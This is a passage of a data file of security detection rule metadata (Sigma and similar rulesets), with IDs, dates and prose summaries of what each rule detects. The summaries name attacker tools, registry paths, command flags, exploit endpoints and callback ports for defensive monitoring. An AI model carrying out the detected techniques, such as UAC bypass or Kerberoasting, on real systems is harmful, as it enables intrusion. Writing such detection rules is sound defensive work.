    Windows that can perform various system-related tasks without displaying any user
    interface. The detection focuses on the presence of the "runassystem" keyword
    in the command line, which may point to potentially malicious activity if used
    inappropriately. Legitimate administration tasks could generate false positives.
  Updated-Date: '2024_09_03'
d91ff53f-fd0c-419d-a6b8-ae038d5c3733:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1be82422e9082e4d166014af5cc328a3
  Ruleset: emerging-threats
  Summary: This rule detects the use of specific binary names, such as 'jpsetup.exe'
    and 'jpinst.exe', which are associated with SNAKE malware during its installation
    phase. The presence of these files in process creation logs may indicate an attempt
    to install the SNAKE malware, which has been detailed by the Cybersecurity and
    Infrastructure Security Agency (CISA). The detection rule is designed to identify
    these binaries while filtering out common command-line arguments that are typically
    seen in false positive scenarios.
  Updated-Date: '2024_09_03'
d93129cd-1ee0-479f-bc03-ca6f129882e3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bfb0b9533f98b0c54e03a4ee53270366
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell scripts that perform system checks
    to identify virtualization environments. Adversaries may use such scripts to avoid
    detection and analysis by modifying their behavior based on the presence of virtual
    machine artifacts. This includes checking for specific objects and systems indicative
    of a virtual environment, such as MSAcpi_ThermalZoneTemperature and Win32_ComputerSystem.
  Updated-Date: '2024_09_04'
d9365e39-febd-4a4b-8441-3ca91bb9d333:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 33ec921e1c9c0106791a4d42803256f6
  Ruleset: emerging-threats
  Summary: This rule detects a specific URL request pattern that includes particular
    file extensions and parameters pointing to an IP address, which has been observed
    in traffic potentially exploiting CVE-2023-36884. This suspicious pattern has
    been associated with campaigns by RomCOM targeting entities such as Ukraine and
    NATO membership talks. The detection focuses on HTTP GET requests containing the
    identified URL pattern.
  Updated-Date: '2024_09_03'
d9367cbb-c2e0-47ce-bdc0-128cb6da898d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4ad554facd66f747baa9ee07ba981961
  Ruleset: core
  Summary: This rule detects the execution of SharpLdapWhoami, a hacking tool that
    acts as an alternative to the standard whoami command by querying the LDAP service
    on a domain controller. It looks specifically for instances where the executable
    file name ends with '\SharpLdapWhoami.exe' or has metadata properties indicating
    it is SharpLdapWhoami, and it also examines command line flags used in its execution,
    such as '/method:ntlm', '/method:kerb', '/method:nego', '/m:nego', '/m:ntlm',
    and '/m:kerb'. The rule is designed to monitor process creation activities on
    Windows systems.
  Updated-Date: '2024_09_03'
d937b75f-a665-4480-88a5-2f20e9f9b22a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ded3c5d64053ee1ce000ed6dad06c22c
  Ruleset: core
  Summary: This rule detects potential privilege escalation in a Windows environment
    by identifying instances where the `sc.exe` utility is executed by a user with
    Medium integrity level to alter service configurations. Specifically, it monitors
    for changes to the `ImagePath` or `FailureCommand` settings of a service, which
    could indicate an attempt to gain elevated privileges. The execution of `sc.exe`
    with these parameters under non-administrator accounts is considered suspicious
    and warrants further investigation.
  Updated-Date: '2024_09_03'
d94a35f0-7a29-45f6-90a0-80df6159967c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2e6569f0a341f62743c2a27008764c81
  Ruleset: sigmahq
  Summary: This rule detects commands related to the shutdown or reconfiguration of
    Cisco systems, specifically identifying instances where a system is either powered
    off or rebooted into different modes. It looks for specific keywords in logs,
    such as 'shutdown' and configuration register values like 'config-register 0x2100'
    and 'config-register 0x2142'. Although legitimate administrators may execute these
    commands, it is considered an uncommon occurrence.
  Updated-Date: '2024_09_04'
d9557b75-267b-4b43-922f-a775e2d1f792:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 43185732d1b00f1b08bf84f28d3fc307
  Ruleset: sigmahq
  Summary: This rule detects when a Point-to-site VPN in Microsoft Azure is modified
    or deleted. It monitors activity logs for operations such as creating, deleting,
    resetting, generating VPN profiles, disconnecting VPN connections, and modifying
    diagnostic settings related to Point-to-site VPN gateways. If modifications or
    deletions are detected, they could indicate unauthorized changes or potential
    security incidents. System administrators may perform these actions, but any changes
    from unfamiliar users should be investigated to prevent false positives.
  Updated-Date: '2024_09_04'
d95de845-b83c-4a9a-8a6a-4fc802ebf6c0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4bc00ac860b4560ac1056d8e7698eb3e
  Ruleset: sigmahq
  Summary: This rule detects suspicious reconnaissance command-line activity on Windows
    systems using Net.EXE. The detection targets the use of Net.EXE or Net1.EXE with
    specific command-line arguments related to group and account operations, such
    as checking for the presence of various administrator and domain groups, local
    and remote desktop user groups, as well as commands making use of domain flags.
    The objective is to identify potential reconnaissance efforts by monitoring for
    these command patterns, while filtering out certain benign activities like legitimate
    account additions to reduce false positives.
  Updated-Date: '2024_09_04'
d99b79d2-0a6f-4f46-ad8b-260b6e17f982:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5a74c9df2450746fbf0c9a0b7382ab1c
  Ruleset: core
  Summary: This rule detects when one of the Windows Eventlogs has been cleared, which
    can occur through the execution of the "wevtutil cl" command. Events indicating
    such activity are characterized by EventID 517 from the Security provider or EventID
    1102 from the Microsoft-Windows-Eventlog provider. This action is often associated
    with attempts to evade defense mechanisms by attackers.
  Updated-Date: '2024_09_03'
da2738f2-fadb-4394-afa7-0a0674885afa:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8df32fb55a0a5dbb7922a574e768e0de
  Ruleset: sigmahq
  Summary: This rule detects the spawning of new processes by the executable `sdclt.exe`,
    which can be indicative of User Account Control (UAC) bypass techniques being
    employed. The scenario suggests that such activity could be associated with malicious
    behavior, particularly privilege escalation attempts.
  Updated-Date: '2024_09_04'
da34e323-1e65-42db-83be-a6725ac2caa3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5f43af3973e6971fdb64fe33c284559f
  Ruleset: sigmahq
  Summary: This rule detects the execution of PowerShell script blocks that utilize
    the "Start-NetEventSession" cmdlet. This cmdlet enables the initiation of event
    and packet capture for a network event session, which an attacker may use to gather
    information during an operation. The data captured through this technique can
    include user credentials, particularly those transmitted over insecure, unencrypted
    protocols.
  Updated-Date: '2024_09_04'
dae8171c-5ec6-4396-b210-8466585b53e9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4e75a10f40a839fb27d0987bb07e19f2
  Ruleset: sigmahq
  Summary: This rule detects non-system users performing privileged operations on
    the Service Control Manager (SCM) database on Windows systems. Specifically, it
    identifies Event ID 4674 where the object type is 'SC_MANAGER OBJECT' and the
    object name is 'servicesactive', alongside the privilege 'SeTakeOwnershipPrivilege'.
    It excludes events where the logon ID is '0x3e4' and the process name ends with
    ':\Windows\System32\services.exe'. This behavior may indicate attempts at privilege
    escalation.
  Updated-Date: '2024_09_04'
daf7eb81-35fd-410d-9d7a-657837e602bb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d2fe500c47463fcd3e817020726b81bd
  Ruleset: sigmahq
  Summary: This rule detects PowerShell scripts that utilize the "Compress-Archive"
    Cmdlet to compress folders and files, storing the output in locations that are
    often associated with malicious activity, such as temporary directories. Adversaries
    may compress collected sensitive data to make it more portable and to reduce the
    volume of data being exfiltrated over the network. These suspicious locations
    commonly include the user's TEMP directory, AppData\Local\Temp, and Windows\Temp
    folders. The aim is to identify potentially malicious activity involving data
    staging and exfiltration using PowerShell.
  Updated-Date: '2024_09_04'
db014773-7375-4f4e-b83b-133337c0ffee:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4545d06510b3e3186a6d05682f37e23b
  Ruleset: core
  Summary: This rule detects the creation of an Inline IAM policy by the S3 Browser
    utility that includes a default placeholder value for an S3 bucket name ("<YOUR-BUCKET-NAME>").
    The detection occurs when the AWS IAM CloudTrail logs show the "PutUserPolicy"
    event, initiated by the S3 Browser user agent, containing the placeholder value
    in the request parameters for S3 bucket permissions. This rule helps identify
    potentially unattended configurations or malicious activities revolving around
    S3 bucket access policies.
  Updated-Date: '2024_09_03'
db014773-b1d3-46bd-ba26-133337c0ffee:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ba4615d4d61965607ea33064c9aebc43
  Ruleset: core
  Summary: This rule detects the activity of the S3 Browser utility performing reconnaissance
    by searching for existing IAM users without a defined LoginProfile and then creating
    a LoginProfile when such users are found. This behavior is indicative of a potential
    security threat, leveraging the IAM API 'GetLoginProfile' and 'CreateLoginProfile'
    actions through the S3 Browser user agent.
  Updated-Date: '2024_09_03'
db014773-d9d9-4792-91e5-133337c0ffee:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2369731682d0a4b6420b130a765c75a5
  Ruleset: core
  Summary: This rule detects the creation of IAM Users or AccessKeys through the S3
    Browser utility in AWS environments. The detection focuses on specific events
    sourced from the AWS IAM service, specifically 'CreateUser' and 'CreateAccessKey'
    events, which are identified by the presence of 'S3 Browser' in the user agent
    field.
  Updated-Date: '2024_09_03'
db1ac3be-f606-4e3a-89e0-9607cbe6b98a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cea070c5f3bf0d9e2020bfc08067af49
  Ruleset: sigmahq
  Summary: This rule detects the use of the "capsh" utility to invoke a shell in Linux
    systems. It specifically identifies cases where the process creation logs show
    the execution of the "capsh" command with a command line ending in ' --'. The
    use of "capsh" is notable for manipulating process capabilities and can potentially
    be used for restricted shell breakouts, which may suggest malicious activity.
  Updated-Date: '2024_09_04'
db6c06c4-bf3b-421c-aa88-15672b88c743:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 55011cabfd2c4b7fc18a77e6e2a6badb
  Ruleset: core
  Summary: This rule detects when changes are made to Privileged Identity Management
    (PIM) roles within Azure.
  Updated-Date: '2024_09_03'
db77ce78-7e28-4188-9337-cf30e2b3ba9f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e0bf097c80d79fa7b7c32acb2d18713c
  Ruleset: sigmahq
  Summary: This rule detects the potential DLL side loading of libraries associated
    with the Wazuh security platform, specifically targeting 'libwazuhshared.dll'
    and 'libwinpthread-1.dll' files. It identifies these events when the DLLs are
    loaded from locations outside typical applications directories such as 'C:\Program
    Files\' and 'C:\Program Files (x86)\'. The rule includes considerations for legitimate
    applications that might use these DLLs, suggesting refined filters for those instances
    to minimize false positives. The detection focuses on identifying uses of these
    DLLs that could indicate actions related to defense evasion, persistence, or privilege
    escalation.
  Updated-Date: '2024_09_04'
db885529-903f-4c5d-9864-28fe199e6370:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a6fc858dfa2edd2428d680ef80b271dc
  Ruleset: sigmahq
  Summary: This rule detects the usage of the PowerShell Get-ADComputer cmdlet to
    collect comprehensive computer information from Active Directory and export it
    to a file. This activity involves using specific script block text patterns that
    indicate the selection and outputting of computer details to files through commands
    such as Select, Out-File, Set-Content, or Add-Content. This behavior is often
    associated with reconnaissance steps taken by malicious actors or scripts. While
    such commands can be part of legitimate administrative scripts, they should be
    monitored closely to differentiate between normal administrative tasks and potential
    malicious activities.
  Updated-Date: '2024_09_04'
db92dd33-a3ad-49cf-8c2c-608c3e30ace0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0776d17913ee640fbd9444af95d525b4
  Ruleset: core
  Summary: This rule detects the use of obfuscated PowerShell scripts that employ
    Clip.exe to manipulate the clipboard, often associated with malicious activity
    aimed at evading detection. The detection is based on specific patterns within
    the script block text that indicate the usage of clipboard operations and obfuscation
    techniques, which are commonly employed in various forms of execution and defense
    evasion scenarios.
  Updated-Date: '2024_09_03'
dbbd9f66-2ed3-4ca2-98a4-6ea985dd1a1c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 519f6aec9c5bc29e5de8811768aea10f
  Ruleset: sigmahq
  Summary: This rule detects attempts to create a DLL file in known desktop application
    dependencies folders such as those for Slack, Teams, or OneDrive, by an unusual
    process. The activity identified may indicate an attempt to load a malicious module
    via DLL search order hijacking. This method can be associated with initial access
    or defense evasion tactics. The detection specifically monitors the creation of
    DLL files within user and application data directories by processes such as Microsoft
    Office applications, cmd.exe, certutil.exe, mshta.exe, script hosts, and various
    PowerShell executables, while excluding benign patterns associated with cmd.exe.
  Updated-Date: '2024_09_04'
dbc1f800-0fe0-4bc0-9c66-292c2abe3f78:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8cfab46c6e73522c5308af320e858cd4
  Ruleset: core
  Summary: This rule detects the deletion of important scheduled tasks by adversaries,
    typically using the `schtasks.exe` command-line tool with the `/delete` and `/tn`
    options. The targeted tasks include those related to critical system functions
    such as BitLocker, Exploit Guard, System Restore, Update Orchestrator, Windows
    Defender, Windows Backup, and Windows Update. This activity is often indicative
    of attempts to stop services or processes to conduct data destructive actions.
  Updated-Date: '2024_09_03'
dbfc7c98-04ab-4ab7-aa94-c74d22aa7376:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e1b1022df593ac42e1fd4027350979f6
  Ruleset: sigmahq
  Summary: This rule detects programs on Linux systems that are connecting to common
    malware callback ports as identified through threat intelligence reports. It monitors
    network connections to specific destination ports such as 888, 999, 2200, and
    others while excluding local and private IP address ranges. This helps identify
    potential command-and-control activity associated with malware presence and persistence,
    aligning with specific adversarial techniques.
  Updated-Date: '2024_09_04'
dc4576d4-7467-424f-9eee-fd2b02855fe0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: caa8ad4208edb89a63d106b9d0d2289a
  Ruleset: sigmahq
  Summary: This rule detects the execution of msdt.exe with the "cab" flag, which
    could indicate suspicious diagcab files containing embedded answer files, potentially
    exploiting CVE-2022-30190. This detection focuses on the use of msdt.exe with
    specific command line parameters that align with potentially malicious behavior.
    This activity could be part of a defense evasion tactic where legitimate troubleshooting
    tools are used with crafted inputs for malicious purposes.
  Updated-Date: '2024_09_04'
dc5c24af-6995-49b2-86eb-a9ff62199e82:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 23051d803e991f0a0958c2368e99b0ac
  Ruleset: sigmahq
  Summary: This rule detects modifications to the Windows Registry `TreatAs` key,
    specifically targeting entries ending with `TreatAs\(Default)`. The manipulation
    of this key can enable the execution of commands via `rundll32.exe -sta`, which
    is indicative of potential persistence mechanisms commonly exploited by malware
    or advanced persistent threats. Different legitimate processes such as `OfficeClickToRun.exe`,
    `integrator.exe`, `svchost.exe`, and `msiexec.exe` are filtered out to minimize
    false positives. Adjustments to the `TreatAs` key can be part of efforts to hijack
    Component Object Model (COM) objects, which is a method attackers use to execute
    payloads surreptitiously.
  Updated-Date: '2024_09_04'
dca1b3e8-e043-4ec8-85d7-867f334b5724:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d1c56cd770aaff8a0dd6923a75a5a88d
  Ruleset: sigmahq
  Summary: This rule detects the creation of PFX (Personal Information Exchange) files,
    indicating a potential adversary activity involving the export of a local certificate.
    This behavior might be seen as an attempt to capture sensitive credential data.
    Specific filters are applied to exclude common, benign paths related to temporary
    or administrative operations, such as those involving Windows templates or CMake
    directories.
  Updated-Date: '2024_09_04'
dcaa3f04-70c3-427a-80b4-b870d73c94c4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 606af4cf89f1323c55d5cfc2dc64dfe6
  Ruleset: sigmahq
  Summary: This rule detects the execution of "csc.exe," which is used to compile
    .NET code dynamically. Attackers often exploit this capability to compile malicious
    code on the fly, integrating it into subsequent stages of their attack. The rule
    identifies instances where "csc.exe" is executed from suspicious locations such
    as "Perflogs," "Users\Public," "AppData\Local\Temp," "Temporary Internet," and
    "Windows\Temp" directories, among others. Additionally, the rule filters out benign
    occurrences where "csc.exe" is executed by common parent applications like those
    from the "Program Files" directories or specific legitimate software such as sdiagnhost.exe,
    w3wp.exe, and tools related to Chocolatey or Ansible. The detection helps in identifying
    malicious activities while minimizing false positives from legitimate use cases.
  Updated-Date: '2024_09_04'
dcc6a01e-9471-44a0-a699-71ea96f8ed8b:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3a73b2c5bd3022ec4fda5ea11e6a13fa
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation attempt of CVE-2020-1472 through the
    execution of the commonly used ZeroLogon Proof of Concept (PoC) executable. It
    monitors the creation of processes where the parent process is `cmd.exe` and the
    executed images are either `cool.exe` or `zero.exe`, with command lines containing
    specific keywords such as 'Administrator' and '-c'. Additionally, it verifies
    the presence of payloads in the command line containing either `taskkill` commands
    or invocations of `powershell`. This detection aims to identify potential unauthorized
    activities indicating a ZeroLogon exploitation attempt, which can lead to significant
    security breaches including full domain compromise.
  Updated-Date: '2024_09_03'
dcd74b95-3f36-4ed9-9598-0490951643aa:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ebabc4e2b5080667d41a2eec1789c2da
  Ruleset: core
  Summary: This rule detects the usage of PowerView cmdlets from the PowerSploit exploitation
    framework by identifying specific command names within PowerShell ScriptBlocks.
    PowerView is a PowerShell tool used for network situational awareness primarily
    useful for security assessments, and the rule aims to detect its usage by flagging
    cmdlets such as `Export-PowerViewCSV`, `Find-DomainLocalGroupMember`, `Get-DomainDNSRecord`,
    `Invoke-Kerberoast`, and many others. These cmdlets can be employed for a variety
    of reconnaissance and exploitation activities within a Windows environment, such
    as enumerating domain trusts, finding sensitive files, and extracting domain-specific
    data. The detection requires Script Block Logging to be enabled to capture and
    analyze the commands being executed within PowerShell scripts.
  Updated-Date: '2024_09_03'
dcdbc940-0bff-46b2-95f3-2d73f848e33b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 54727649e4070361892a590b127443aa
  Ruleset: core
  Summary: This rule detects suspicious child processes initiated by the print spool
    service (`spoolsv.exe`). Such activities may include the launching of system-level
    executables like `gpupdate.exe`, `whoami.exe`, `taskkill.exe`, `wmic.exe`, `taskmgr.exe`,
    `sc.exe`, `findstr.exe`, `curl.exe`, `wget.exe`, `certutil.exe`, `bitsadmin.exe`,
    `write.exe`, or `wuauclt.exe`. It also alerts on network-based commands executed
    via `net.exe` or `net1.exe`, particularly those involving the 'start' command.
    Further monitoring includes tracking the execution of `cmd.exe` with specific
    arguments such as `.spl` files or routes addition, and `netsh.exe` with port or
    rule configurations. Additionally, the detection extends to suspicious uses of
    `powershell.exe` and `pwsh.exe` with specific arguments, as well as activity involving
    `rundll32.exe`. The rule aims to identify potentially exploitative actions indicative
    of privilege escalation or remote code execution attempts linked to the print
    spool service's operations.
  Updated-Date: '2024_09_03'
dce29957-6cb5-4fcf-9497-0e50d6372357:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fe023acb4d751eef0f2b1b80311484e4
  Ruleset: securityonion-resources
  Summary: This rule detects when the Simple Network Management Protocol (SNMP) service
    on a Security Onion Intrusion Detection Honeypot (IDH) node receives an Object
    Identifier (OID) request.
  Updated-Date: '2024_08_07'
dcf2db1f-f091-425b-a821-c05875b8925a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e59754aa658a0fa979628a0d371f7769
  Ruleset: core
  Summary: This rule detects the obfuscated use of environment variables to execute
    PowerShell commands on Windows systems. Specifically, it identifies Event ID 4697,
    which corresponds to the installation of new services often leveraged for malicious
    purposes. The detection mechanism searches for instances where `cmd.exe` is utilized
    with options '/c' or '/r' in conjunction with the 'set' command and '-f' flag,
    indicating attempts to embed and execute obfuscated PowerShell scripts.
  Updated-Date: '2024_09_03'
dd218fb6-4d02-42dc-85f0-a0a376072efd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3ea6edb109ec3e4ec79f66a37d6ae179
  Ruleset: emerging-threats
  Summary: This rule detects an attempt to leverage the vulnerable servlet "mboximport"
    in Zimbra Collaboration Suite Email Server for an unauthenticated remote command
    injection. The detection focuses on specific POST requests to the "/service/extension/backup/mboximport"
    endpoint containing parameters like 'account-name,' 'ow,' 'no-switch,' and 'append.'
    It also monitors requests to the '/zimbraAdmin/' directory ending with '.jsp'
    and checks for relevant HTTP status codes, such as 401 and 200.
  Updated-Date: '2024_09_03'
dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e98bd618a957726f9f76af300dee7205
  Ruleset: sigmahq
  Summary: This rule detects the creation of a scheduled task using the "-XML" flag
    with a file that lacks the '.xml' extension. This action is often associated with
    a potential defense evasion tactic aimed at maintaining persistence on the system.
    The rule focuses on the process creation logs, specifically looking for the use
    of 'schtasks.exe' and the '-XML' or '/xml' command line arguments, while filtering
    out common legitimate scenarios and system processes to minimize false positives.
    This suspicious activity could be part of an attack where the adversary is trying
    to blend malicious XML files among typical files, avoiding detection by traditional
    security mechanisms.
  Updated-Date: '2024_09_04'
dd3ee8cc-f751-41c9-ba53-5a32ed47e563:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9cd025e25a60d1d30af589590758a85c
  Ruleset: sigmahq
  Summary: This rule detects attempts by threat actors to add or modify registry keys
    in Windows systems. Specifically, it looks for the suspicious use of the `reg
    add` command targeting the `hkcu\software\classes\ms-settings\shell\open\command`
    path, with commands involving `/ve`, `/d`, or `/v DelegateExecute`. Additionally,
    it monitors for the use of the `reg delete` command targeting `hkcu\software\classes\ms-settings`.
    Such activities are commonly associated with dumping SAM, SECURITY, and SYSTEM
    registry hives, which are indicative of credential access techniques used in attacks,
    such as those seen in the Diavol ransomware.
  Updated-Date: '2024_09_04'
dd6b39d9-d9be-4a3b-8fe0-fe3c6a5c1795:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2698fd2fa598d374fb7abcd09c3fdf4d
  Ruleset: sigmahq
  Summary: This rule detects the use of NTFS 8.3 short names in command-line inputs,
    which could be exploited to bypass command-line detection mechanisms. The rule
    identifies command-lines containing filenames with '~1' or '~2' suffixes such
    as `~1.exe`, `~1.bat`, `~1.msi`, etc. It includes filters to exclude common legitimate
    use cases, such as processes related to Webex or certain executable paths like
    `C:\xampp\vcredist\VCREDI~1.EXE`. Although some legitimate applications may occasionally
    use this file naming notation, each instance should be investigated by examining
    the parent and child processes to rule out false positives.
  Updated-Date: '2024_09_04'
dd80db93-6ec2-4f4c-a017-ad40da6ffe81:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e586641bb235bdf883ca7c8ce625b700
  Ruleset: sigmahq
  Summary: This rule detects issues with Windows Defender Real-Time Protection features
    on Windows systems. It identifies instances where the Real-Time Protection feature
    has either encountered an error and failed or has restarted. Specific reasons
    for these detections include the system missing critical updates required for
    running the Network Inspection System or the antimalware security intelligence
    stopping for an unknown reason. The rule helps in identifying potential cases
    of defense evasion as part of an attack, though some events may need manual exception
    due to insufficient information.
  Updated-Date: '2024_09_04'
ddb26b76-4447-4807-871f-1b035b2bfa5d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: df2f77e7e195f3cc9f963362393a060d
  Ruleset: sigmahq
  Summary: This rule detects the creation of sudoers files or files within the "sudoers.d"
    directory on Linux systems. The creation of such files can be a potential method
    for a user to persistently elevate privileges. This activity may indicate an attempt
    to manipulate access controls to maintain unauthorized administrative access.
  Updated-Date: '2024_09_04'
ddcd88cb-7f62-4ce5-86f9-1704190feb0a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a28735998660014f58bb4fea81ff9f22
  Ruleset: sigmahq
  Summary: This rule detects the usage of "Reflection.Assembly" load functions to
    dynamically load assemblies in memory. It identifies PowerShell scripts that contain
    the specific text '[Reflection.Assembly]::load', which indicates the dynamic in-memory
    loading of assemblies. This behavior is often associated with defense evasion
    techniques used by advanced persistent threats (APTs) or malware to avoid detection.
  Updated-Date: '2024_09_04'
ddd171b5-2cc6-4975-9e78-f0eccd08cc76:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e04b26408adb2cac89a1d8f94d366053
  Ruleset: core
  Summary: This rule detects potential persistence activity via the Outlook home page.
    An attacker can achieve code execution and maintain persistence by modifying specific
    WebView registry keys within the Windows operating system. This technique exploits
    the capability of setting a home page in Outlook, using the registry keys associated
    with Outlook's WebView feature.
  Updated-Date: '2024_09_03'
dddfebae-c46f-439c-af7a-fdb6bde90218:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5ade85358e7aa7326eca9b2fa10bd06d
  Ruleset: sigmahq
  Summary: This rule detects the execution of the SyncAppvPublishingServer process,
    which is commonly used by adversaries to bypass PowerShell execution restrictions.
  Updated-Date: '2024_09_04'
dde85b37-40cd-4a94-b00c-0b8794f956b5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fb89b89940f1c44bae9c6bc6f4d370ee
  Ruleset: sigmahq
  Summary: This rule detects the creation of remote tasks through the use of at.exe
    or APIs that interact with the ATSVC named pipe. The interaction with the ATSVC
    named pipe, especially when occurring over the IPC$ share, is indicative of remote
    task creation which can be used for lateral movement or persistence by attackers.
    The detection relies on monitoring specific path and name patterns within the
    SMB files service of Zeek.
  Updated-Date: '2024_09_04'
de16d92c-c446-4d53-8938-10aeef41c8b6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bbac39dcd10daa7dd004138b79954dfb
  Ruleset: sigmahq
  Summary: This rule detects password changes for a computer's domain account or host
    principal using "ksetup.exe". The detection focuses on the process creation events
    where the image name ends with 'ksetup.exe', or where the command line includes
    the argument '/setcomputerpassword'. This activity could indicate an attempt to
    alter domain account credentials, which may be related to administrative actions
    or potential security incidents.
  Updated-Date: '2024_09_04'
de1bd0b6-6d59-417c-86d9-a44114aede3b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 11187d3531670a574076e979c12efad2
  Ruleset: emerging-threats
  Summary: This rule detects indicators of exploitation associated with the PaperCut
    MF/NG print management software. Specifically, it identifies the execution of
    commands involving PowerShell and the download of a "setup.msi" file, as well
    as the usage of the "msiexec" utility to install this "setup.msi" file silently
    using specific command line arguments. These behaviors are indicative of attempts
    to exploit vulnerabilities in the PaperCut software by executing malicious scripts
    or installing unauthorized software.
  Updated-Date: '2024_09_03'
de25eeb8-3655-4643-ac3a-b662d3f26b6b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 11bbe3ec087695ae1c65f09fe9d98a80
  Ruleset: sigmahq
  Summary: This rule detects the use of utilities such as 'systemctl', 'service',
    and 'chkconfig' to stop or disable tools and services on Linux systems. It identifies
    commands that include the keywords 'stop' or 'disable' to determine if services
    are being halted or turned off.
  Updated-Date: '2024_09_04'
de41232e-12e8-49fa-86bc-c05c7e722df9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 950a7347a3cfcc28503e54cbf665b608
  Ruleset: sigmahq
  Summary: This rule detects suspicious PowerShell commands that utilize the System.Net.WebClient
    class methods, specifically focusing on the DownloadFile and DownloadString functions.
    These functions are commonly used in PowerShell scripts that download content
    from the internet.
  Updated-Date: '2024_09_04'
de46c52b-0bf8-4936-a327-aace94f94ac6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eac5c2d35b163521edc856762c469112
  Ruleset: core
  Summary: This rule detects the creation of Process Explorer drivers by processes
    other than Process Explorer itself. It aims to identify potential misuse wherein
    hack tools or malware may exploit the Process Explorer driver to elevate privileges,
    temporarily drop it to disk, execute a service using that driver, and subsequently
    remove it. This activity can indicate attempts to bypass security measures using
    the Process Explorer driver.
  Updated-Date: '2024_09_03'
de587dce-915e-4218-aac4-835ca6af6f70:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1f4c26de83befa3adc4e1041e8a0f132
  Ruleset: sigmahq
  Summary: This rule detects the use of the reg.exe command-line tool to add entries
    to the RUN key in the Windows Registry, which is a common method for establishing
    persistence on a system. The detection focuses on command-line activity involving
    the reg.exe tool that includes the "ADD" argument and references the "Software\Microsoft\Windows\CurrentVersion\Run"
    path, indicative of modifying autorun settings. False positives may occur when
    legitimate software or administrators make similar changes for valid reasons.
  Updated-Date: '2024_09_04'
de7ce410-b3fb-4e8a-b38c-3b999e2c3420:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1e9d75e4a5c3006373df7102038891ae
  Ruleset: sigmahq
  Summary: This rule detects the installation of the PAExec service on a Windows system.
